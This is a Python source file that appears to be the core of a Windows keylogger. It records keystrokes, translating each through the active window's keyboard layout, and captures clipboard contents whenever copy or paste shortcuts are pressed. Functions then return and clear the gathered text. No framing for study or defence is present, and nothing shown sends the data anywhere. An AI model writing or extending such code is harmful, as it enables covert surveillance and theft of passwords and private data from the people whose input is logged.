import ctypes
import re
import pyperclip
from key_constants import LAYOUT_MAP, LANGS, MODIFIER_KEYS, SPECIAL_PRINTING_KEYS, NON_PRINTING_KEYS


last_types = ""
last_copies = ""


def get_keyboard_layout() -> str:
    user32 = ctypes.WinDLL('user32', use_last_error=True)
    hwnd = user32.GetForegroundWindow()
    thread_id = user32.GetWindowThreadProcessId(hwnd, None)
    layout_id = user32.GetKeyboardLayout(thread_id)
    return LAYOUT_MAP.get(layout_id & 0xFFFF, 'Unknown layout')


def translate_key(key: str) -> str:
    layout = get_keyboard_layout()
    for lang in LANGS:
        if key in LANGS[lang]:
            return LANGS[layout][LANGS[lang].index(key)]


def press(key) -> None:
    global last_types, last_copies

    if key is None:
        return

    key = key.char if hasattr(key, 'char') else str(key)
    if key is None:
        return

    if key == '\x16':
        last_copies += f"\n[Pasted] {pyperclip.paste()}\n"
    elif key == '\x03':
        last_copies += f"\n[Copied] {pyperclip.paste()}\n"
    elif bool(re.search(r'Key\.f\w*', key)) or bool(re.search(r'[\x00-\x1F\x7F]', key)):
        return
    elif key in MODIFIER_KEYS:
        return
    elif key in SPECIAL_PRINTING_KEYS:
        last_types += SPECIAL_PRINTING_KEYS[key]
    elif key in NON_PRINTING_KEYS:
        last_types += f"[{NON_PRINTING_KEYS[key]}]"
    elif len(key) == 1:
        last_types += translate_key(key)


def get_types() -> str:
    global last_types
    result, last_types = last_types, ""
    return result


def get_copies() -> str:
    global last_copies
    result, last_copies = last_copies, ""
    return result
    